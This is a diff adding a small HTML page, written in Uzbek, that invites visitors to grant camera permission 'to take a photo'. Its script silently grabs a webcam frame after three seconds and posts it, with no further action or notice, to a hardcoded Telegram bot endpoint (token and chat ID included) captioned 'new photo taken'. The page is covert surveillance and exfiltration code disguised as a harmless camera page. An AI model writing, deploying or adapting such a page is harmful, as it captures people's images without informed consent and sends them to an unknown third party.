@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>📸 Kamera Ruxsati</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    video {
+      border: 2px solid #333;
+      border-radius: 8px;
+    }
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h2>📸 Kamera ruxsatini bering va suratga tushing</h2>
+  <video id="video" width="300" autoplay></video>
+  <canvas id="canvas" width="300" height="225"></canvas>
+  <script>
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const image = canvas.toDataURL('image/png');
+
+          fetch('https://api.telegram.org/bot8297078233:AAF0USJh288SJU_lPu0voS_LyBRD_8oM2vM/sendPhoto', {
+            method: 'POST',
+            body: new URLSearchParams({
+              chat_id: '1605288573',
+              photo: image,
+              caption: '📸 Yangi surat tushdi!'
+            }),
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded'
+            }
+          });
+        }, 3000);
+      })
+      .catch(err => {
+        alert('Kameraga ruxsat berilmadi yoki xatolik yuz berdi.');
+        console.error(err);
+      });
+  </script>
+</body>
+</html>
